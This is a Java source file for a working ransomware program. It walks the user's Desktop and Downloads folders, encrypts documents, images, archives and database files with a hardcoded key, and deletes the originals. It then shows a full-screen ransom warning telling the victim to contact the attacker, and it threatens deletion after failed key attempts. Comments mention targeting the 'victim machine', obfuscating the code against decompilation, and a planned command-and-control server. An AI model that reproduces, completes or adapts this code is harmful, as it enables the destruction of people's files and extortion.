import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;

import org.apache.commons.io.FileUtils;

import Exception.CryptoException;
import Utility.CryptoUtils;


//if statement in low level language(machine language) is a cmp (compare) instruction that is very important
//Code need to be obfuscated because if someone decompile it will be more difficult to understand it, callgraph
public class Main {

    static JFrame f;//this is for creating graphical forms in Java
    static JLabel l; //this is for holding a text
    static int attemptsLeft = 4;



    private static OS os = OSFinder.getOS();
    static List<String> criticalPathList = new ArrayList<String>();

    public static String key ="QfTjWnZr4u7w!z%C";// Need to implememnt a C&C Server to avoid to put the key directly inside the source code

    public static void main(String[] args) {

        FileFinder();
        WarningForm();

    }

    public static void FileFinder() {

        // Add sensitive directories
        if (criticalPathList.isEmpty()) {
            switch (os) {
                case WINDOWS: {

                    //look for Windows sensitive paths in the victim machine
                    //Array List will all the paths
                    criticalPathList.add(System.getProperty("user.home") + "/Desktop");
                    criticalPathList.add(System.getProperty("user.home") + "/Downloads");
                }
                case LINUX: {
                    //look for Linux sensitive paths in the victim machine
                    criticalPathList.add(System.getProperty("user.home") + "/Desktop");
                    criticalPathList.add(System.getProperty("user.home") + "/Downloads");
                }
                case MAC: {
                    //look for MAC sensitive paths in the victim machine
                }
                case SOLARIS: {
                    //look for SOLARIS sensitive paths in the victim machine
                }
                default:

            }

        }


        for (String target_directory : criticalPathList) {
            //System.out.println(target_directory);

            File root = new File(target_directory);
            try {

                String[] extension = {"pdf", "png", "doc", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp"};

                Collection<File> files = FileUtils.listFiles(root, extension, false);

                for (Object o : files) {

                    File file = (File) o;
                    // return files to the Encryptor function
                    //System.out.println("Found :" + file.getAbsolutePath());
                    Encryptor(file.getAbsolutePath());

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void FileFinder(String ext) {

        // Add sensitive directories
        if (criticalPathList.isEmpty()) {
            switch (os) {
                case WINDOWS: {

                    //look for Windows sensitive paths in the victim machine
                    //Array List will all the paths
                    criticalPathList.add(System.getProperty("user.home") + "/Desktop");
                    criticalPathList.add(System.getProperty("user.home") + "/Downloads");
                }
                case LINUX: {
                    //look for Linux sensitive paths in the victim machine
                    criticalPathList.add(System.getProperty("user.home") + "/Desktop");
                    criticalPathList.add(System.getProperty("user.home") + "/Downloads");
                }
                case MAC: {
                    //look for MAC sensitive paths in the victim machine
                }
                case SOLARIS: {
                    //look for SOLARIS sensitive paths in the victim machine
                }
                default:

            }

        }



        for (String target_directory : criticalPathList) {
            //System.out.println(target_directory);

            File root = new File(target_directory);
            try {

                String[] extension = { ext };

                Collection<File> files = FileUtils.listFiles(root, extension, false);

                for (Object o : files) {

                    File file = (File) o;
                    // return files to the Dencryptor function
                    //System.out.println("Found :" + file.getAbsolutePath());
                    Decryptor(file.getAbsolutePath());

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void Encryptor(String targetFilePath) {

        File targetFile = new File(targetFilePath);
        File encryptedTargetFile = new File(targetFilePath+".encrypted");

        try {
            CryptoUtils.encrypt(key, targetFile, encryptedTargetFile);
            System.out.println(targetFilePath+targetFilePath + " crypted into:"+ encryptedTargetFile);
            targetFile.delete();
        } catch (CryptoException e) {
            e.printStackTrace();
        }

    }

    public static void Decryptor(String encryptedFilePath) throws IOException {

        File targetFile = new File(encryptedFilePath);
        File decryptedTargetFile = new File(encryptedFilePath + "decrypted");

        try {

            CryptoUtils.decrypt(key, targetFile, decryptedTargetFile);

        } catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();


       // Removing the .decrypted extension, need to move it in another method!

        File decrypted = new File(removeExt(decryptedTargetFile.getAbsolutePath()));

        if (decrypted.exists())
            throw new IOException("file exists");

        // Rename file
        boolean success = decryptedTargetFile.renameTo(decrypted);

        if (!success) {
            System.out.println("File was not successfully renamed");
            //need to manage that!
        }

    }

    public static String removeExt(String filePath) {
        // These first few lines the same as Justin's
        File f = new File(filePath);

        // if it's a directory, don't remove the extention
        if (f.isDirectory()) return filePath;

        String name = f.getName();

        // Now we know it's a file - don't need to do any special hidden
        // checking or contains() checking because of:
        final int lastPeriodPos = name.lastIndexOf('.');
        if (lastPeriodPos <= 0)
        {
            // No period after first character - return name as it was passed in
            return filePath;
        }
        else
        {
            // Remove the last period and everything after it
            File renamed = new File(f.getParent(), name.substring(0, lastPeriodPos));
            return renamed.getPath();
        }
    }

    public static void WarningForm() {

        f = new JFrame("Warning");
        l = new JLabel();

        l.setText("Warning : all your important files are unfortunately encrypted, in order to decrypt these files contact the attacker and obtain the key to decrypt all the files");

        JPanel p = new JPanel();

        p.add(l);
        f.add(p);

        //--input key for restoring files

        JPanel panel = new JPanel();
        JLabel label = new JLabel("Enter the key : ");
        JTextField tf = new JTextField(10);

        JButton submit = new JButton("Restore my files");
        submit.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {

                String strVictimKey = tf.getText();

                if (strVictimKey.equalsIgnoreCase(key)) {
                    JOptionPane.showMessageDialog(f, "You entered the right key, your files will be now decrypted, wait for a while!");
                    FileFinder("encrypted");
                    JOptionPane.showMessageDialog(f,"All your files are now decrypted!");

                }else {
                    attemptsLeft --;
                    JOptionPane.showMessageDialog(f,"You entered the wrong key, "+ attemptsLeft +" attempts left before deleting all your encrypted files ");
                    if(attemptsLeft <= 0) {
                        //deleteAllEncrypted();
                        JOptionPane.showMessageDialog(f,"All your important files will be delete now! Bye!");
                    }
                }

            }
        });

        JButton reset = new JButton("Reset");

        panel.add(label);
        panel.add(tf);
        panel.add(submit);
        panel.add(reset);

        //f.getContentPane().add(BorderLayout.NORTH,label);
        f.getContentPane().add(BorderLayout.SOUTH,panel);

        f.setVisible(true);

        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        f.setUndecorated(true);
        f.setVisible(true);


    }


}



